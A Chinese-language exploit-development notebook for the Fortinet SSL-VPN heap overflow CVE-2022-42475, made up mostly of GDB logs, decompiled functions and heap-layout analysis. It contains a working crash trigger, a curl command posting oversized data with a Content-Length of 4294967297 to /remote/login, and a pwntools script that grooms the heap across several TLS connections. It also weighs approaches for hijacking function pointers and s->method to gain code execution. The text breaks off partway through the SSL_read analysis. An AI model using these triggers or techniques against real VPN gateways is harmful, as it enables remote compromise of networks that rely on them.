Breakpoint 1, 0x00007fa9d2248935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7fa9ccba2c00

Breakpoint 3, 0x00007fa9d2248d4d in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
s->method addr:0x7fa9d22999e0

Breakpoint 1, 0x00007fa9d2248935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7fa9ccba4800

Breakpoint 3, 0x00007fa9d2248d4d in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
s->method addr:0x7fa9d22999e0

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7fa9ccba6418

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7fa9c9f90418

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7fa9ca09b418


```

情景一：s->method的地址为0x7f9fcf4d69e0，read_post_data 的地址为0x7f9fc802c418，s->method 的地址比read_post_data高，相差为0x74AA5C8( 122332616  大约为116M内存)。设置s->method的低3字节为0，那么为0x7f9fcf000000，设置read_post_data分配的大小为200M，那分配内存的开始结束为：0x7f9fc802c418、0x7f9fc802c418+0xC800000 = 0x7F9FD482C418。此时s->method指向了我们分配的内存中



情景二：s->method的地址为0x7fa9d22999e0，read_post_data 的地址为0x7fa9ccba6418，s->method 的地址比read_post_data高，相差为0x56F35C8( 91174344  大约为86M内存)。设置s->method的低3字节为0，那么为0x7fa9d2000000，设置read_post_data分配的大小为200M，那分配内存的开始结束为：0x7fa9ccba6418、0x7fa9ccba6418+0xC800000 = 0x7FA9D93A6418。此时s->method指向了我们分配的内存中。



行不通，直接覆盖很大的内存，会破坏其他的数据，造成崩溃，且需要向服务器发送几百M的数据。

### 思路二

修改 s->method 的地址为特定的函数指针表,如：

```
.data:0000000003F04148                 dq offset sub_1086290
.data:0000000003F04150                 dq offset aBinAlertmail ; "/bin/alertmail"
.data:0000000003F04158                 dq offset sub_4628D0
.data:0000000003F04160                 dq offset aBinAcsSdnChang ; "/bin/acs-sdn-change"
.data:0000000003F04168                 dq offset sub_1E60DD0
.data:0000000003F04170                 dq offset aBinAcsSdnUpdat ; "/bin/acs-sdn-update"
.data:0000000003F04178                 dq offset sub_1E60DF0
.data:0000000003F04180                 dq offset aBinAcsSdnStatu ; "/bin/acs-sdn-status"
.data:0000000003F04188                 dq offset sub_1E60E10
.data:0000000003F04190                 dq offset unk_2B700BA
.data:0000000003F04198                 dq offset sub_4730F0
.data:0000000003F041A0                 dq offset unk_2B700C5
.data:0000000003F041A8                 dq offset sub_4733F0
.data:0000000003F041B0                 dq offset unk_2B700D2
.data:0000000003F041B8                 dq offset sub_A218B0
.data:0000000003F041C0                 dq offset aBinFssod     ; "/bin/fssod"
```

但是只能执行没有参数的命令，没有什么实际意义



```
.data:0000000003F133C0 off_3F133C0     dq offset aClearBgp     ; DATA XREF: sub_506380+AB↑o
.data:0000000003F133C0                                         ; "clear bgp *"
.data:0000000003F133C8                 dq offset sub_504280
.data:0000000003F133D0                 dq offset off_3F133A0   ; "Reset functions"
.data:0000000003F133D8                 align 40h
```

### 思路三

参考资料 A More Complete Exploit for Fortinet CVE-2022-42475。



在函数sub_1715180中，偶然间触发了一次崩溃，v9的值变为了0x414141414141

```
__int64 __fastcall sub_1715180(__int64 a1, char a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  int v4; // er14
  __int64 v5; // r12
  __int64 v6; // rbx
  __int64 v7; // rsi
  __int64 v8; // rdx
  __int64 (__fastcall *v9)(__int64); // rax
  __int64 v10; // rax

  v2 = qword_BBA80C0;
  if ( qword_BBA80C0 - 1000 - *(_QWORD *)(a1 + 984) >= 0 )
  {
    sub_166BB70();
    v2 = qword_BBA80C0;
  }
  if ( v2 - (unsigned int)(*(_DWORD *)(a1 + 912) + 1000) >= 0 )
  {
    sub_166BE70(a1);
    v2 = qword_BBA80C0;
  }
  if ( v2 - (unsigned int)(*(_DWORD *)(a1 + 936) + 12000) >= 0 )
    sub_162B390(a1);
  if ( !a2 || (result = sub_162AA90(a1), (int)result >= 0) )
  {
    v4 = 0;
    result = sub_1722770(a1);
    do
    {
      v5 = a1 + 32 * (v4 + 6LL);
      if ( (*(_BYTE *)(v5 + 16) & 2) != 0 )
      {
        result = sub_1713A40(a1, v4, 1u);
        if ( (_DWORD)result )
          goto LABEL_23;
        *(_BYTE *)(v5 + 16) &= 0xFDu;
      }
      v6 = a1 + 32 * (v4 + 6LL);
      if ( (*(_BYTE *)(v6 + 16) & 4) != 0 )
      {
        result = sub_1713A40(a1, v4, 0);
        if ( (_DWORD)result )
        {
LABEL_23:
          v10 = *(_QWORD *)(a1 + 664);
          if ( v10 )
          {
            v9 = *(__int64 (__fastcall **)(__int64))(v10 + 136);
            if ( v9 )
              return v9(a1);
          }
          return sub_1713E80(a1);
        }
        *(_BYTE *)(v6 + 16) &= 0xFBu;
      }
      ++v4;
    }
    while ( v4 != 5 );
    v7 = *(_QWORD *)(a1 + 664);
    if ( v7 )
    {
      v8 = *(_QWORD *)(v7 + 112);
      if ( v8 )
      {
        result = v7 + 96;
        if ( v8 != v7 + 96 )
        {
          v9 = *(__int64 (__fastcall **)(__int64))(v8 + 200);
          if ( v9 )
            return v9(a1);
          result = sub_1713400(a1, v7, v8);
        }
      }
    }
  }
  return result;
}
```


如何稳定触发呢？

根据函数 sub_15F14A0 

```c
void *__fastcall sub_15F14A0(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v6; // r14
  _QWORD *v7; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) >> 3) + 1);
    if ( (unsigned __int64)&v3[v4] > *v2 )
    {
      v6 = dword_A782904 - 25;
      if ( v6 < v4 )
        v6 = 8LL * (int)(((a2 - 1) >> 3) + 1);
      v7 = (_QWORD *)je_malloc(v6 + 24);
      if ( !v7 )
        sub_15F3F90();
      v7[1] = 0LL;
      v7[2] = v7 + 3;
      *v7 = (char *)v7 + v6 + 24;
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v7;
      v3 = (char *)v7[2];
      *(_QWORD *)(a1 + 8) = v7;
      v7[2] = &v3[v4];
    }
    else
    {
      v2[2] = &v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
```

以及动态调试，我们可以知道最低内存分配大小为1024字节(jemalloc的参数，实际为1000，24字节用于对块管理的)，低于1000字节的话，会从上一次分配的1000字节中剩余的部分进行分配



根据函数sub_1724730

```c
char *__fastcall sub_1724730(__int64 *a1, const char *a2, int a3, int a4, __int64 a5)
{
  size_t v7; // rax
  _QWORD *v8; // rax
  __int64 v9; // r12
  _QWORD *v10; // rax
  __int64 *v11; // rax

  v7 = strlen(a2);
  v8 = sub_15F14A0(*a1, v7 + 209);
  v9 = (__int64)v8;
  if ( v8 )
  {
    *v8 = v8;
    v8[1] = v8;
    v10 = &v8[4 * a3];
    *((_DWORD *)v10 + 6) = a4;
    *((_DWORD *)v10 + 7) = a4;
    if ( (a4 & 1) != 0 )
    {
      *(_QWORD *)(32LL * a3 + v9 + 32) = a5;
    }
    else if ( (a4 & 4) != 0 )
    {
      *(_QWORD *)(32LL * a3 + v9 + 40) = a5;
    }
    strcpy((char *)(v9 + 208), a2);
    v11 = (__int64 *)a1[13];
    a1[13] = v9;
    *(_QWORD *)v9 = a1 + 12;
    *(_QWORD *)(v9 + 8) = v11;
    *v11 = v9;
  }
  return (char *)v9;
}
```

我们知道关于状态表（ssl_accept --> ap_read_request --> .....）结构体的大小为：

```
9       breakpoint     keep y   0x0000000001724754 
	breakpoint already hit 258 times
        printf "struct name:%s\n",$rdi
        continue
10      breakpoint     keep y   0x0000000001724763 
	breakpoint already hit 258 times
        printf "struct size:%d\n",$rsi
        continue
11      breakpoint     keep y   0x0000000001724768 
	breakpoint already hit 66 times
        printf "struct addr:%p\n",$rax
        continue
```



```
Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f69018

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f690f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f691e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f692c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f69418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f69500

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7cc18

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7ccf8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7cde0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7cec0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7c818

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f7c900

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f81418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f814f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f815e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f816c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f81018

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f81100

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f68418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f684f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f685e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f686c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f68818

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f68900

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba4f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba5e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba6c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba818

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fba900

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f63018

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f630f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f631e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f632c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f63418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f63500

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f64818

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f648f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f649e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f64ac0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f64c18

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f64d00

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e018

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e0f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e1e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e2c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54f8e500

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa0818

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa08f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa09e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa0ac0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa0c18

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54fa0d00

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:219

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf018

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ssl_accept_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:225

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf0f8

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:224

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf1e0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:ap_read_request_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:230

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf2c0

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:226

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf418

Breakpoint 9, 0x0000000001724754 in ?? ()
struct name:get_mimie_headers_write

Breakpoint 10, 0x0000000001724763 in ?? ()
struct size:232

Breakpoint 11, 0x0000000001724768 in ?? ()
struct addr:0x7fad54faf500

```

根据函数

sub_1712020

```c
__int64 __fastcall sub_1712020(__int64 a1, __int64 a2)
{
  __int64 v3; // rbx
  int v4; // esi

  v3 = sub_17200F0(*(_DWORD *)(a1 + 0x90));
  sub_1724730((__int64 *)a2, "ssl_accept", 0, 1, (__int64)sub_1711BA0);
  sub_1724730((__int64 *)a2, "ssl_accept_write", 0, 5, (__int64)sub_1711D00);
  sub_1724730((__int64 *)a2, "ap_read_request", 0, 1, (__int64)sub_1711EF0);
  sub_1724730((__int64 *)a2, "ap_read_request_write", 0, 5, (__int64)sub_1711F10);
  sub_1724730((__int64 *)a2, "get_mimie_headers", 0, 1, (__int64)sub_1711FF0);
  sub_1724730((__int64 *)a2, "get_mimie_headers_write", 0, 5, (__int64)sub_1712000);
  sub_1724880(a2, (__int64)sub_1710EE0);
  sub_17248B0(a2, (__int64)sub_1712010);
  v4 = 2000;
  if ( v3 )
    v4 = 100 * *(_DWORD *)(v3 + 64);
  sub_1724890(a2, v4, 0LL);
  return 0LL;
}
```

我们可以知道一次ssl连接初始化会创建:ssl_accept、ssl_accept_write、ap_read_request、ap_read_request_write、get_mimie_headers、get_mimie_headers_write个状态表。

他们的大小分别为：219、225、224、230、226、232，8字节对齐后：224、232、224、232、232、232 ，对齐后共计：224+232+224+232+232+232 =1376字节



是否可以尝试通过read_post_data分配1024字节的内存块，然后覆盖后面的sconn结构体的这些状态表来复现呢？使其在后续read/write的时候，调用状态转换表中的函数，变为我们指定的值呢？

 

```
handle SIGPIPE nostop
b *0x000000000171A602 
commands
    printf "read post data alloc addr:%p\n",$rax
    continue
end

b *0x0000000001724754
commands
    printf "struct name:%s\n",$rdi
    continue
end

b *0x0000000001724763
commands
    printf "struct size:%d\n",$rsi
    continue
end

b *0x0000000001724768
commands
    printf "struct addr:%p\n",$rax
    continue
end
```

还是不行，因为连接过程中，会覆盖掉其他的结构体，造成崩溃，无法利用

### 思路四

还是参考 A More Complete Exploit for Fortinet CVE-2022-42475 中的大力出奇迹，不去管什么堆布局什么的了

```
perl -e 'print "A"x100000' > payload 
curl --data-binary @payload -H 'Content-Length: 4294967297' -vik 'https://192.168.182.188:8443/remote/login'
```

但是要靠机会才能到达jmp rax哪里，能否进行精简呢？或者进行简单的堆布局呢？

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string
import struct
import subprocess

SSLVPND_WORKER_COUNT = 3
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 51

HOST = "192.168.182.188"
PORT = 8443  

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

socks = []
for i in range(SSLVPND_WORKER_COUNT):
    sk = create_ssl_socket()
    socks.append(sk)

time.sleep(2)
for sk in socks:
    sk.sendall(("POST %s HTTP/1.1\r\n"%("/remote/login")).encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("Host: %s:%d\r\n"%(HOST,PORT)).encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r\n").encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("Content-Type: text/plain;charset=UTF-8\r\n").encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("Connection: keep-alive\r\n").encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("Content-Length: %d\r\n"%(5)).encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("\r\n").encode())

time.sleep(2)
for sk in socks:
    sk.sendall(("hell").encode()) # 注意我们的content len 是5 字节， 但是只发送了4字节

time.sleep(20)
```

```
b *0x0000000001713A9F 
commands
    printf "read handler name:%s\n",$rcx+208
    continue
end
```

output:
```
Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:ap_read_request					# 对应：sk.sendall(("POST %s HTTP/1.1\r\n"%("/remote/login")).encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("Host: %s:%d\r\n"%(HOST,PORT)).encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r\n").encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("Content-Type: text/plain;charset=UTF-8\r\n").encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("Connection: keep-alive\r\n").encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("Content-Length: %d\r\n"%(5)).encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers				# sk.sendall(("\r\n").encode())

Breakpoint 2, 0x0000000001713a9f in ?? ()
read handler name:read_post_data           #正常情况下，后续应该http_write_memory 但是我们content_len 为5 ，我们只发送了4，造成等待，对应sk.sendall(("hell").encode())
```

通过分析发现，在收到HTTP头的"\r\n"后，就会创建read_post_data函数表指针，我们是否可以让两个sk 都处于 get_mimie_headers 到 read_post_data 函数表指针创建之间，然后让第一个到达read_post_data，通过bug申请一个1字节的缓冲区，然后让第二个也到达read_post_data，我们然后通过第一个sk覆盖第二个的read_post_data函数表指针呢？

有用的gdb监控脚本：

```
b *0x000000000171A5FD  
commands
    printf "read post data alloc size:%d\n",$rsi
    continue
end

b *0x000000000171A602 
commands
    printf "read post data alloc addr:%p\n",$rax
    continue
end

b *0x000000000171A749 
commands
    printf "read post data handler table alloc addr:%p\n",$rax
    continue 
end
```

分析发现，还是不可靠，因为都是小内存分配请求，在一次正常的请求中，存在大量的类似该大小的请求，会破坏我们的堆风水。

### 思路五

继续尝试修改s->method的值为特定地址

```
.....................................
Breakpoint 4, 0x00007f3bd7f49935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f3bd0a02000
.....................................
Breakpoint 5, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7f3bd0a00418
```

分析发现，read_post_data alloc addr 距离 ssl alloc addr 为 7144字节

ssl addr + 8 为 method的地址

ssl addr + 48 为handshake_func

ssl addr + 56 为server

ssl addr + 68 为shutdown

ssl addr + 100 为init

ssl addr + 132 为early_data_state

ssl addr + 1497 为mode

如果我们的崩溃要触发到SSL_read 去执行 s->method->ssl_read的话，需要设置

handshake_func地址

server为1，

shutdown为0

early_data_state 为0

mode为0



SSL_read 调用 s->method->ssl_read 汇编代码为：

```asm
=> 0x7f3bd7f44e54:	mov    rax,QWORD PTR [rax+0x38]
   0x7f3bd7f44e58:	add    rsp,0x30
   0x7f3bd7f44e5c:	pop    rbp
   0x7f3bd7f44e5d:	pop    r12
   0x7f3bd7f44e5f:	pop    r13
   0x7f3bd7f44e61:	pop    r14
